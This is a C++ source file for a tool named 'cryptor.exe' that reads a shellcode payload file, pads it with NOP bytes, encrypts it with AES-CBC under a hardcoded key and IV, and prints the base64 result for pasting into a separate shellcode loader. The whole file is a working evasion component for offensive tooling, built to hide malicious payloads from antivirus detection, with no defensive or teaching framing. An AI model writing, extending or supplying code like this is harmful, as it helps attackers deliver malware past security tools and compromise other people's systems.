#include <iostream>
#include <vector>
#include <string>
#include <fstream>
#include <iterator>
#include "aes.hpp"
#include "base64.h"


std::vector<uint8_t> readFile(const char* filename)
{
    // open the file:
    std::ifstream file(filename, std::ios::binary);

    // Stop eating new lines in binary mode!!!
    file.unsetf(std::ios::skipws);

    // get its size:
    std::streampos fileSize;

    file.seekg(0, std::ios::end);
    fileSize = file.tellg();
    file.seekg(0, std::ios::beg);

    // reserve capacity
    std::vector<BYTE> vec;
    vec.reserve(fileSize);

    // read the data:
    vec.insert(vec.begin(), std::istream_iterator<BYTE>(file), std::istream_iterator<BYTE>());

    return vec;
}

int main(int argc, char* argv[])
{
    if (argc < 2)
    {
        printf("Usage:\tcryptor.exe <payload.bin>\n");
        printf("Example\tcryptor.exe C:\\Users\\admin\\shellcode.bin\n");
        exit(1);
    }

    std::vector<uint8_t> plaintext, ciphertext;

    // AES Objects
    struct AES_ctx e_ctx;
    uint8_t iv[] = { 0x89,0x54,0x7f,0x64,0xc0,0xce,0x3a,0x44,0xf0,0xee,0xaf,0x1,0xa8,0xdc,0x6b,0x65 };
    uint8_t key[] = { 0x70,0x76,0x20,0xf2,0x3f,0x4c,0x4c,0x10,0x45,0xfb,0x50,0x93,0xd8,0xd1,0xc9,0xfb,0x6c,0x30,0x45,0x88,0xdd,0xb2,0xf4,0xaf,0x9c,0x1c,0x22,0x13,0x26,0x67,0x24,0xbd };
    AES_init_ctx_iv(&e_ctx, key, iv);

    plaintext.clear();
    plaintext = readFile(argv[1]);
    
    // Padd the plaintext if needed with NOPS
    while ((plaintext.size() % 16) != 0)
    {
        plaintext.push_back(0x90);
    }

    // ENCRYPT
    ciphertext.clear();
    AES_CBC_encrypt_buffer(&e_ctx, plaintext.data(), plaintext.size());             // Encrypt the plaintext data
    std::copy(plaintext.begin(), plaintext.end(), std::back_inserter(ciphertext));  // Load the ciphertext into the ciphertext vector.

    std::cout << "[i] Replace shellcode string in loader with one below:\n" << std::endl;
    // ENCODE
    base64 b64 = base64();
    std::string encoded = b64.base64_encode(plaintext.data(), plaintext.size());
    printf("shellcode = \"%s\";", encoded.c_str());

}

